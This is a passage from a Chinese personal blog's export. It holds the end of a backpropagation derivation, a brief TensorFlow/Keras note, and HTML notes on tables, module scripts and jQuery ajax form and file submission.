<p>$$ \begin{aligned}<br>    \frac{\partial E_d}{\partial y_j} &amp; &#x3D; \frac{\partial \frac{1}{2}\sum_{j}(t_j - y_j)^2}{\partial y_j} &#x3D; -(t_j - y_j) \\<br>    \frac{\partial y_j}{\partial net_j} &amp; &#x3D; \frac{\partial sigmoid(net_j)}{\partial net_j} &#x3D; y_j(1 - y_j) \\<br>    \frac{\partial net_j}{\partial w_{ji}} &amp; &#x3D; \frac{\partial \sum_{i} w_{ji}x_{ji}}{\partial w_{ji}} &#x3D; x_{ji} \\<br>    \frac{\partial E_d}{\partial net_j} &amp; &#x3D; -(t_j - y_j)y_j(1 - y_j) &#x3D; -\delta_j<br>\end{aligned} $$</p>
<p>代入得</p>
<p>$$ \frac{\partial E_d}{\partial w_{ji}} &#x3D; \frac{\partial E_d}{\partial y_j}\frac{\partial y_j}{\partial net_j}\frac{\partial net_j}{\partial w_{ji}} &#x3D; -(t_j - y_j)y_j(1 - y_j)x_{ji} &#x3D; -\delta_j x_{ji} $$</p>
<p>所以输出层的 $ w_{ji} $ 训练规则为：</p>
<p>$$ w_{ji} \leftarrow w_{ji} - \eta\frac{\partial E_d}{\partial w_{ji}} &#x3D; w_{ji} + \eta \delta_j x_{ji} $$</p>
<h5 id="隐藏层"><a href="#隐藏层" class="headerlink" title="隐藏层"></a>隐藏层</h5><p>用递推公式，设隐藏层有 $ n $ 层</p>
<h6 id="第-n-层隐藏层"><a href="#第-n-层隐藏层" class="headerlink" title="第 $ n $ 层隐藏层"></a>第 $ n $ 层隐藏层</h6><p>$$ \frac{\partial E_d}{\partial w_{j_ni}} &#x3D; \frac{\partial E_d}{\partial net_{j_n}}\frac{\partial net_{j_n}}{\partial w_{j_ni}} $$</p>
<p>$ E_d $ 不是 $ net_{j_n} $ 直接函数，但输出层的 $ net_{j_o} $ 是 $ net_{j_n} $ 的函数，且有</p>
<p>$$ \frac{\partial E_d}{\partial net_{j_n}} &#x3D; \sum_{j_o}\frac{\partial E_d}{\partial net_{j_o}}\frac{\partial net_{j_o}}{\partial net_{j_n}} &#x3D; \sum_{j_o}-\delta_{j_o}\frac{\partial net_{j_o}}{\partial net_{j_n}} $$</p>
<p>设 $ y_{j_n} $ 为隐藏层第 $ j_n $ 个神经元的输出，同时也是输出层所有神经元的第 $ j_n $ 输入 $ x_{j_n} $，</p>
<p>$$ \begin{aligned}<br>    \frac{\partial net_{j_o}}{\partial net_{j_n}} &amp; &#x3D; \frac{\partial net_{j_o}}{\partial y_{j_n}}\frac{\partial y_{j_n}}{\partial net_{j_n}} \\<br>    \frac{\partial net_{j_o}}{\partial y_{j_n}} &amp; &#x3D; \frac{\partial \sum_{i} w_{j_oi}x_{j_oi}}{\partial y_{j_n}} &#x3D; w_{j_oj_n} \\<br>    \frac{\partial y_{j_n}}{\partial net_{j_n}} &amp; &#x3D; \frac{\partial sigmoid(net_{j_n})}{\partial net_{j_n}} &#x3D; y_{j_n}(1 - y_{j_n})<br>\end{aligned} $$</p>
<p>代入得</p>
<p>$$ \begin{aligned}<br>    \frac{\partial E_d}{\partial net_{j_n}} &amp; &#x3D; \sum_{j_o}\frac{\partial E_d}{\partial net_{j_o}}\frac{\partial net_{j_o}}{\partial net_{j_n}} \\<br>    &amp; &#x3D; \sum_{j_o} -\delta_{j_o} w_{j_oj_n} y_{j_n} (1 - y_{j_n}) \\<br>    &amp; &#x3D; y_{j_n} (1 - y_{j_n}) \sum_{j_o} -\delta_{j_o} w_{j_oj_n} \\<br>    &amp; &#x3D; -\delta_{j_n}<br>\end{aligned} $$</p>
<h6 id="递推到第-n-k-层"><a href="#递推到第-n-k-层" class="headerlink" title="递推到第 $ n - k $ 层"></a>递推到第 $ n - k $ 层</h6><p>$$ \frac{\partial E_d}{\partial w_{j_{n-k}i}} &#x3D; \frac{\partial E_d}{\partial net_{j_{n-k}}}\frac{\partial net_{j_{n-k}}}{\partial w_{j_{n-k}i}} &#x3D; -\delta_{j_{n - k}}x_{j_{n - k}i} $$</p>
<p>其中</p>
<p>$$ \delta_{j_{n - k}} &#x3D;  y_{j_{n - k}} (1 - y_{j_{n - k}}) \sum_{j_{n - k + 1}} \delta_{j_{n - k + 1}} w_{j_{n - k + 1}j_{n - k}} $$</p>
]]></content>
      <categories>
        <category>Knowledge</category>
        <category>Study</category>
      </categories>
      <tags>
        <tag>算法</tag>
        <tag>AI</tag>
      </tags>
  </entry>
  <entry>
    <title>tensorflow学习笔记</title>
    <url>/blogs/2018-12-19-tensorflowNotes/</url>
    <content><![CDATA[<h1 id="TensorFlow是什么"><a href="#TensorFlow是什么" class="headerlink" title="TensorFlow是什么"></a>TensorFlow是什么</h1><ul>
<li>TensorFlow是谷歌基于DistBelief进行研发的第二代人工智能学习系统</li>
<li>用于语音识别或者图像识别多项机器学习和深度学习领域</li>
<li>将复杂的数据结构传输到人工智能神经网中进行分析和处理过程的系统、</li>
<li>支持CNN、RNN和LSTM算法，都是Image、Speech和NLP最流行的深度神经网络模型</li>
</ul>
<h1 id="tensorflow语法"><a href="#tensorflow语法" class="headerlink" title="tensorflow语法"></a>tensorflow语法</h1><p>语法细节可以看<a href="https://tensorflow.google.cn/guide">tensorflow官方文档</a>，下面记录的是自己觉得需要记录的东西</p>
<h2 id="keras"><a href="#keras" class="headerlink" title="keras"></a>keras</h2><p>keras是tensorflow的上层api，可以使用keras方便的实现神经网络的搭建</p>
<h3 id="数据处理"><a href="#数据处理" class="headerlink" title="数据处理"></a>数据处理</h3><h4 id="to-categorical"><a href="#to-categorical" class="headerlink" title="to_categorical"></a>to_categorical</h4><p>将标签转化成容易输出的类型，如10个数字作为输出，可转成[1, 0, …, 0]表示0这种形式</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> tensorflow <span class="keyword">as</span> tf</span><br><span class="line">tmp = tf.keras.utils.to_categorical(Y_train, num_classes = <span class="number">10</span>)</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Program</category>
        <category>Python</category>
      </categories>
  </entry>
  <entry>
    <title>HTML笔记</title>
    <url>/blogs/2018-12-05-htmlNotes/</url>
    <content><![CDATA[<h1 id="一、语法相关"><a href="#一、语法相关" class="headerlink" title="一、语法相关"></a>一、语法相关</h1><h2 id="1-上下标"><a href="#1-上下标" class="headerlink" title="1. 上下标"></a>1. 上下标</h2><figure class="highlight html"><table><tr><td class="code"><pre><span class="line">y = x<span class="tag">&lt;<span class="name">sup</span>&gt;</span>2<span class="tag">&lt;/<span class="name">sup</span>&gt;</span></span><br><span class="line">H<span class="tag">&lt;<span class="name">sub</span>&gt;</span>2<span class="tag">&lt;/<span class="name">sub</span>&gt;</span>O</span><br></pre></td></tr></table></figure>

<p>效果</p>
<p>y &#x3D; x<sup>2</sup><br>H<sub>2</sub>O</p>
<h2 id="2、表格"><a href="#2、表格" class="headerlink" title="2、表格"></a>2、表格</h2><h3 id="2-1-表格和表头"><a href="#2-1-表格和表头" class="headerlink" title="2.1. 表格和表头"></a>2.1. 表格和表头</h3><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">table</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">th</span>&gt;</span>Heading<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">th</span>&gt;</span>Another Heading<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">td</span>&gt;</span>row 1, cell 1<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">td</span>&gt;</span>row 1, cell 2<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">td</span>&gt;</span>row 2, cell 1<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">td</span>&gt;</span>row 2, cell 2<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">table</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>效果</p>
<table><tr><th>Heading</th><th>Another Heading</th></tr><tr><td>row 1, cell 1</td><td>row 1, cell 2</td></tr><tr><td>row 2, cell 1</td><td>row 2, cell 2</td></tr></table>

<h3 id="2-2-合并单元格"><a href="#2-2-合并单元格" class="headerlink" title="2.2. 合并单元格"></a>2.2. 合并单元格</h3><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">h4</span>&gt;</span>横跨两列的单元格：<span class="tag">&lt;/<span class="name">h4</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">table</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">th</span>&gt;</span>姓名<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">th</span> <span class="attr">colspan</span>=<span class="string">&quot;2&quot;</span>&gt;</span>电话<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">td</span>&gt;</span>Bill Gates<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">td</span>&gt;</span>555 77 854<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">td</span>&gt;</span>555 77 855<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">table</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">h4</span>&gt;</span>横跨两行的单元格：<span class="tag">&lt;/<span class="name">h4</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">table</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">th</span>&gt;</span>姓名<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">td</span>&gt;</span>Bill Gates<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">th</span> <span class="attr">rowspan</span>=<span class="string">&quot;2&quot;</span>&gt;</span>电话<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">td</span>&gt;</span>555 77 854<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">td</span>&gt;</span>555 77 855<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">table</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>效果</p>
<h4>横跨两列的单元格：</h4>
<table><tr><th>姓名</th><th colspan="2">电话</th></tr><tr><td>Bill Gates</td><td>555 77 854</td><td>555 77 855</td></tr></table>

<h4>横跨两行的单元格：</h4>
<table><tr><th>姓名</th><td>Bill Gates</td></tr><tr><th rowspan="2">电话</th><td>555 77 854</td></tr><tr><td>555 77 855</td></tr></table>

<h2 id="3-脚本标签"><a href="#3-脚本标签" class="headerlink" title="3. &lt;script&gt; 脚本标签"></a>3. <code>&lt;script&gt;</code> 脚本标签</h2><h3 id="3-1-使用import报错"><a href="#3-1-使用import报错" class="headerlink" title="3.1. 使用import报错"></a>3.1. 使用import报错</h3><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">canvas</span> <span class="attr">id</span>=<span class="string">&quot;drawing&quot;</span> <span class="attr">width</span>=<span class="string">&quot;500&quot;</span> <span class="attr">height</span>=<span class="string">&quot;200&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">canvas</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">import</span> &#123; drawArrayRect &#125; <span class="keyword">from</span> <span class="string">&quot;/lib/diy_canvas/drawArrayRect.js&quot;</span>;</span></span><br><span class="line"><span class="language-javascript">    ...</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Uncaught SyntaxError: Cannot use import statement outside a module</span><br></pre></td></tr></table></figure>

<p>加上<code>type=&quot;module&quot;</code>就好了</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">canvas</span> <span class="attr">id</span>=<span class="string">&quot;drawing&quot;</span> <span class="attr">width</span>=<span class="string">&quot;500&quot;</span> <span class="attr">height</span>=<span class="string">&quot;200&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">canvas</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;module&quot;</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">import</span> &#123; drawArrayRect &#125; <span class="keyword">from</span> <span class="string">&quot;/lib/diy_canvas/drawArrayRect.js&quot;</span>;</span></span><br><span class="line"><span class="language-javascript">    ...</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h2 id="4-表单提交"><a href="#4-表单提交" class="headerlink" title="4. 表单提交"></a>4. 表单提交</h2><h3 id="4-1-上传文件"><a href="#4-1-上传文件" class="headerlink" title="4.1. 上传文件"></a>4.1. 上传文件</h3><ul>
<li>一定要加上<code>enctype=&quot;multipart/form-data&quot;</code></li>
</ul>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;/uploadfile&quot;</span> <span class="attr">method</span>=<span class="string">&quot;POST&quot;</span> <span class="attr">enctype</span>=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;file&quot;</span> <span class="attr">name</span>=<span class="string">&quot;file&quot;</span>/&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h2 id="5-ajax提交"><a href="#5-ajax提交" class="headerlink" title="5. ajax提交"></a>5. ajax提交</h2><ul>
<li>需要使用<code>jquery.min.js</code>库才能使用ajax</li>
</ul>
<h3 id="5-1-提交json"><a href="#5-1-提交json" class="headerlink" title="5.1. 提交json"></a>5.1. 提交json</h3><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;./jquery.min.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">function</span> <span class="title function_">submitform</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">let</span> send_value;</span></span><br><span class="line"><span class="language-javascript">            <span class="comment">// 从id获取</span></span></span><br><span class="line"><span class="language-javascript">            send_value = &#123;</span></span><br><span class="line"><span class="language-javascript">                <span class="attr">firstName</span>: <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;fname&quot;</span>).<span class="property">value</span>,</span></span><br><span class="line"><span class="language-javascript">                <span class="attr">lastName</span>: <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;lname&quot;</span>).<span class="property">value</span>,</span></span><br><span class="line"><span class="language-javascript">            &#125;;</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">            <span class="comment">// 表单转化</span></span></span><br><span class="line"><span class="language-javascript">            send_value = &#123;&#125;;</span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">let</span> form_data = $(<span class="string">&#x27;#myForm&#x27;</span>).<span class="title function_">serializeArray</span>();</span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">for</span> (<span class="keyword">const</span> value <span class="keyword">of</span> form_data) &#123;</span></span><br><span class="line"><span class="language-javascript">                send_value[value.<span class="property">name</span>] = value.<span class="property">value</span>;</span></span><br><span class="line"><span class="language-javascript">            &#125;</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">            <span class="variable language_">console</span>.<span class="title function_">log</span>(send_value);</span></span><br><span class="line"><span class="language-javascript">            $.<span class="title function_">ajax</span>(&#123;</span></span><br><span class="line"><span class="language-javascript">                <span class="attr">type</span>: <span class="string">&quot;POST&quot;</span>,</span></span><br><span class="line"><span class="language-javascript">                <span class="attr">url</span>: <span class="string">&quot;/a/b/c&quot;</span>,</span></span><br><span class="line"><span class="language-javascript">                <span class="attr">data</span>: <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(send_value),</span></span><br><span class="line"><span class="language-javascript">                <span class="attr">dataType</span>: <span class="string">&quot;json&quot;</span>,</span></span><br><span class="line"><span class="language-javascript">                contentType : <span class="string">&quot;application/json&quot;</span>,</span></span><br><span class="line"><span class="language-javascript">                <span class="attr">success</span>: <span class="keyword">function</span>(<span class="params"></span>)&#123;</span></span><br><span class="line"><span class="language-javascript">                    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;send success&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">                &#125;,</span></span><br><span class="line"><span class="language-javascript">                <span class="attr">error</span>: <span class="keyword">function</span> (<span class="params">response</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">                    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;get error &quot;</span> + response.<span class="property">responseText</span>);</span></span><br><span class="line"><span class="language-javascript">                &#125;,</span></span><br><span class="line"><span class="language-javascript">            &#125;);</span></span><br><span class="line"><span class="language-javascript">        &#125;</span></span><br><span class="line"><span class="language-javascript">    </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">form</span> <span class="attr">id</span>=<span class="string">&quot;myForm&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">&quot;first_name&quot;</span>&gt;</span>First Name:<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;first_name&quot;</span> <span class="attr">id</span>=<span class="string">&quot;fname&quot;</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">&quot;last_name&quot;</span>&gt;</span>Last Name:<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;last_name&quot;</span> <span class="attr">id</span>=<span class="string">&quot;lname&quot;</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">value</span>=<span class="string">&quot;Submit&quot;</span> <span class="attr">type</span>=<span class="string">&quot;button&quot;</span> <span class="attr">onclick</span>=<span class="string">&quot;submitform();&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="5-2-提交表单"><a href="#5-2-提交表单" class="headerlink" title="5.2. 提交表单"></a>5.2. 提交表单</h3><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;./jquery.min.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">function</span> <span class="title function_">submitform</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">            $.<span class="title function_">ajax</span>(&#123;</span></span><br><span class="line"><span class="language-javascript">                <span class="attr">type</span>: <span class="string">&quot;POST&quot;</span>,</span></span><br><span class="line"><span class="language-javascript">                <span class="attr">url</span>: <span class="string">&quot;/a/b/c&quot;</span>,</span></span><br><span class="line"><span class="language-javascript">                <span class="attr">data</span>: $(<span class="string">&quot;#myForm&quot;</span>).<span class="title function_">serialize</span>(),</span></span><br><span class="line"><span class="language-javascript">                <span class="attr">success</span>: <span class="keyword">function</span>(<span class="params"></span>)&#123;</span></span><br><span class="line"><span class="language-javascript">                    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;send success&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">                &#125;,</span></span><br><span class="line"><span class="language-javascript">            &#125;);</span></span><br><span class="line"><span class="language-javascript">        &#125;</span></span><br><span class="line"><span class="language-javascript">    </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">form</span> <span class="attr">id</span>=<span class="string">&quot;myForm&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">&quot;first_name&quot;</span>&gt;</span>First Name:<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;first_name&quot;</span> <span class="attr">id</span>=<span class="string">&quot;fname&quot;</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">&quot;last_name&quot;</span>&gt;</span>Last Name:<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;last_name&quot;</span> <span class="attr">id</span>=<span class="string">&quot;lname&quot;</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">value</span>=<span class="string">&quot;Submit&quot;</span> <span class="attr">type</span>=<span class="string">&quot;button&quot;</span> <span class="attr">onclick</span>=<span class="string">&quot;submitform();&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="5-3-上传文件"><a href="#5-3-上传文件" class="headerlink" title="5.3. 上传文件"></a>5.3. 上传文件</h3><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;./jquery.min.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">function</span> <span class="title function_">submitform</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">            $.<span class="title function_">ajax</span>(&#123;</span></span><br><span class="line"><span class="language-javascript">                <span class="attr">type</span>: <span class="string">&quot;POST&quot;</span>,</span></span><br><span class="line"><span class="language-javascript">                <span class="attr">url</span>: <span class="string">&quot;/uploadfile&quot;</span>,</span></span><br><span class="line"><span class="language-javascript">                <span class="attr">data</span>: <span class="keyword">new</span> <span class="title class_">FormData</span>($(<span class="string">&#x27;#myForm&#x27;</span>)[<span class="number">0</span>]),</span></span><br><span class="line"><span class="language-javascript">                <span class="attr">processData</span>: <span class="literal">false</span>,     <span class="comment">// 不预处理数据</span></span></span><br><span class="line"><span class="language-javascript">                <span class="attr">contentType</span>: <span class="literal">false</span>,     <span class="comment">// 必须，虽然不知道为什么</span></span></span><br><span class="line"><span class="language-javascript">                <span class="attr">success</span>: <span class="keyword">function</span> (<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">                    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;send success&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">                &#125;,</span></span><br><span class="line"><span class="language-javascript">            &#125;);</span></span><br><span class="line"><span class="language-javascript">        &#125;</span></span><br><span class="line"><span class="language-javascript">    </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">form</span> <span class="attr">id</span>=<span class="string">&quot;myForm&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;file&quot;</span> <span class="attr">name</span>=<span class="string">&quot;file&quot;</span> /&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">value</span>=<span class="string">&quot;Submit&quot;</span> <span class="attr">type</span>=<span class="string">&quot;button&quot;</span> <span class="attr">onclick</span>=<span class="string">&quot;submitform();&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

